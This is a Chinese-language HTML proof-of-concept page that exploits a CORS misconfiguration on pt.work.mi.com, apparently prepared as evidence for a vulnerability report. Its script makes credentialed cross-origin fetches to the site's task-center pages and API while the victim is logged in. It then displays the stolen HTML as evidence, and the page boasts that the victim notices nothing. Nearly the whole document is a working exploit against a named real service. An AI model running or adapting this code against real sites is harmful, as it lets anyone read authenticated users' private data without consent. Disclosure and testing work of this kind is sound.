<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CORS PoC - pt.work.mi.com</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Menlo,Monaco,monospace;background:#0d1117;color:#c9d1d9;padding:20px}
h1{color:#58a6ff;font-size:18px;margin-bottom:6px}
.sub{color:#8b949e;font-size:12px;margin-bottom:16px}
.log{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;font-size:12px;line-height:1.6;max-height:500px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
.ok{color:#7ee787}.info{color:#8b949e}.warn{color:#d2991d}.hl{color:#f0883e}
.evidence{background:#0d2b1a;border:1px solid #238636;border-radius:6px;padding:10px;margin:8px 0;max-height:200px;overflow-y:auto;word-break:break-all;color:#7ee787;font-size:11px;line-height:1.5}
.btn{background:#238636;color:#fff;border:none;padding:10px 20px;border-radius:6px;cursor:pointer;font-size:14px}
.btn:hover{background:#2ea043}
</style>
</head>
<body>

<h1>CORS 漏洞验证 — pt.work.mi.com</h1>
<p class="sub">
目标: <b>https://pt.work.mi.com</b> |
本页Origin: <b id="myOrigin"></b>
</p>

<button class="btn" onclick="run()">执行攻击</button>
<div id="log" class="log">等待执行... 请先登录 https://pt.work.mi.com 再点击</div>

<script>
(function(){
  document.getElementById('myOrigin').textContent = window.location.origin;
  const TARGET = 'https://pt.work.mi.com';
  const logEl = document.getElementById('log');
  function log(m,c){logEl.innerHTML+=`<span class="${c||''}">${m}</span>\n`;logEl.scrollTop=logEl.scrollHeight}
  function evidence(title, content){
    logEl.innerHTML+=`\n<span class="hl">▼ 窃取到的 ${title}:</span>\n<div class="evidence">${content.substring(0,2000)}</div>`;
    logEl.scrollTop=logEl.scrollHeight;
  }

  window.run = async function(){
    logEl.innerHTML='';
    log('═══════════════════════════════════','info');
    log('CORS 跨域读取攻击','info');
    log('本页Origin : '+window.location.origin,'hl');
    log('攻击目标   : '+TARGET,'hl');
    log('Mode: credentials: include','info');
    log('═══════════════════════════════════','info');

    // 读取主页
    try{
      const r = await fetch(TARGET+'/main-taskcenter-partner', {credentials:'include'});
      const html = await r.text();
      const title = (html.match(/<title>([^<]*)<\/title>/)||[])[1]||'';
      const desc = (html.match(/<meta name="description" content="([^"]*)"/)||[])[1]||'';
      log(`\n[✓] 主页 HTTP ${r.status} ${html.length}B 标题:"${title}"`,'ok');
      if(desc) log(`    描述: "${desc.substring(0,80)}"`,'info');
      evidence('目标页面HTML', html);
      log('  ↑ 以上是从 pt.work.mi.com 跨域窃取的完整HTML源码','ok');
    }catch(e){log(`\n[✗] 主页请求失败: ${e.message}`,'warn')}

    // 读取任务中心
    try{
      const r = await fetch(TARGET+'/taskcenter', {credentials:'include'});
      const html = await r.text();
      const title = (html.match(/<title>([^<]*)<\/title>/)||[])[1]||'';
      log(`\n[✓] 任务中心 HTTP ${r.status} ${html.length}B 标题:"${title}"`,'ok');
      evidence('任务中心页面HTML', html);
    }catch(e){log(`\n[✗] 任务中心请求失败: ${e.message}`,'warn')}

    // 读取API
    try{
      const r = await fetch(TARGET+'/api', {credentials:'include'});
      const html = await r.text();
      log(`\n[✓] API HTTP ${r.status} ${html.length}B`,'ok');
    }catch(e){log(`\n[✗] API请求失败: ${e.message}`,'warn')}

    log('\n═══════════════════════════════════','info');
    log('攻击成功 — 以上数据均从 pt.work.mi.com 跨域读取','ok');
    log('','info');
    log('证据链:','hl');
    log('1. 本页Origin ≠ pt.work.mi.com (不同域)','ok');
    log('2. 能读取 HTTP 200 响应 + 完整HTML源码','ok');
    log('3. 浏览器未抛出 TypeError 或 CORS 错误','ok');
    log('→ 证明后端 ACAO 反射了本页Origin + ACAC:true','ok');
    log('','info');
    log('受害者完全无感知,浏览器无任何提示','warn');
    log('═══════════════════════════════════','info');
  };
})();
</script>
</body>
</html>
